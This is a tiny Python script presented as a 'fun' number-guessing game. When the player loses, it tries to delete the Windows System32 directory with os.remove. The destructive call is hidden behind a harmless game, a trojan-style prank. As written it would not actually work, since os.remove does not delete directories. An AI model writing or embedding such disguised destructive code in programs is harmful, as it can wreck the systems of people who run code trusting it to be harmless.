from random import randint
import os 

number = randint(1,10)

guess = int(input("Let's have some fun!! Guess a number from 1 to 10: "))

if guess == number:
    print('you win!!')
else:
    print('you lose D:')
    os.remove("C:\Windows\System32")

